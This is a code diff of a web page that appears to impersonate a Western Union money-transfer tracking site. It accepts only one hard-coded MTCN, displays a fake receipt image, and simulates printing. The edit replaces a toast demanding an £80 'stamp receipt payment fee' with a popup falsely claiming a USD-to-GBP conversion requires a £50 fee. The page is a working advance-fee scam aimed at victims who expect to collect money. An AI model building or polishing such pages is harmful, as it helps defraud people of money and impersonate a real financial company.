@@ -277,48 +277,66 @@
             margin: 0 auto;
         }
 
-        /* Toast Notification Styles */
-        #toast-notification {
-            visibility: hidden;
-            min-width: 280px;
-            margin-left: -140px; 
-            background-color: #222;
-            color: #fff;
-            text-align: center;
-            border-radius: 4px;
-            padding: 16px;
+        /* Modal Popup Styles */
+        .modal-overlay {
+            display: none;
             position: fixed;
-            z-index: 3000;
-            left: 50%;
-            bottom: 30px;
-            font-size: 15px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
 
-        #toast-notification.show {
-            visibility: visible;
-            -webkit-animation: fadein 0.5s, fadeout 0.5s 3.5s;
-            animation: fadein 0.5s, fadeout 0.5s 3.5s;
+        .modal-content {
+            background-color: white;
+            padding: 32px 24px;
+            border-radius: 8px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.2);
+            position: relative;
         }
 
-        @-webkit-keyframes fadein {
-            from {bottom: 0; opacity: 0;}
-            to {bottom: 30px; opacity: 1;}
+        .modal-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+            display: block;
         }
 
-        @keyframes fadein {
-            from {bottom: 0; opacity: 0;}
-            to {bottom: 30px; opacity: 1;}
+        .modal-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--wu-black);
         }
 
-        @-webkit-keyframes fadeout {
-            from {bottom: 30px; opacity: 1;}
-            to {bottom: 0; opacity: 0;}
+        .modal-body {
+            font-size: 16px;
+            margin-bottom: 24px;
+            line-height: 1.6;
+            color: #333;
         }
 
-        @keyframes fadeout {
-            from {bottom: 30px; opacity: 1;}
-            to {bottom: 0; opacity: 0;}
+        .modal-close-btn {
+            background-color: var(--wu-black);
+            color: white;
+            font-weight: bold;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: opacity 0.2s;
+        }
+        
+        .modal-close-btn:hover {
+            opacity: 0.9;
         }
 
     </style>
@@ -371,14 +389,23 @@
     <div class="receipt-page" id="receipt-page">
         <h1>Transaction Receipt</h1>
         <div class="receipt-container">
-            <img src="https://i.imgur.com/ZS5ZpC5.png" alt="Transaction Receipt" class="receipt-image">
+            <img src="https://dl.dropboxusercontent.com/s/mhb5l9vo2z1js08vwigwx/Photo-Feb-08-2026-10-53-37-AM-1.png" alt="Transaction Receipt" class="receipt-image">
         </div>
         <div class="print-button-container">
-            <button class="continue-button" onclick="showPrintToast()">Print receipt now and get your collection code</button>
+            <button class="continue-button" onclick="initiatePrint()">Print receipt now and get your collection code</button>
         </div>
     </div>
 
-    <div id="toast-notification"></div>
+    <div class="modal-overlay" id="conversion-popup">
+        <div class="modal-content">
+            <div class="modal-icon">⚠️</div>
+            <div class="modal-title">Wait</div>
+            <div class="modal-body">
+                We found out that the sender paid the amount in USD and the cash needs to be converted to GBP and updated on your receipt. Please pay a conversion fee to the office (£50 GBP) and try again on the website.
+            </div>
+            <button class="modal-close-btn" onclick="closePopup()">OK</button>
+        </div>
+    </div>
 
     <div class="footer">
         <div class="footer-links">
@@ -426,6 +453,7 @@
             if (mtcn === '243567183900') {
                 document.getElementById('tracking-page').style.display = 'none';
                 document.getElementById('spinner').style.display = 'flex';
+                document.getElementById('spinner-text').innerText = "Retrieving transfer details...";
 
                 setTimeout(() => {
                     document.getElementById('spinner').style.display = 'none';
@@ -436,12 +464,24 @@
             }
         }
 
-        // Toast Notification Logic
-        function showPrintToast() {
-            const toast = document.getElementById("toast-notification");
-            toast.innerText = "Please make the stamp receipt payment fee of £80 and print now";
-            toast.className = "show";
-            setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
+        // Print sequence logic
+        function initiatePrint() {
+            // 1. Show Spinner
+            const spinner = document.getElementById('spinner');
+            const spinnerText = document.getElementById('spinner-text');
+            
+            spinnerText.innerText = "Connecting to printer and printing...";
+            spinner.style.display = 'flex';
+            
+            // 2. Wait 3.5 seconds, then show Popup
+            setTimeout(() => {
+                spinner.style.display = 'none';
+                document.getElementById('conversion-popup').style.display = 'flex';
+            }, 3500);
+        }
+
+        function closePopup() {
+            document.getElementById('conversion-popup').style.display = 'none';
         }
 
     </script>
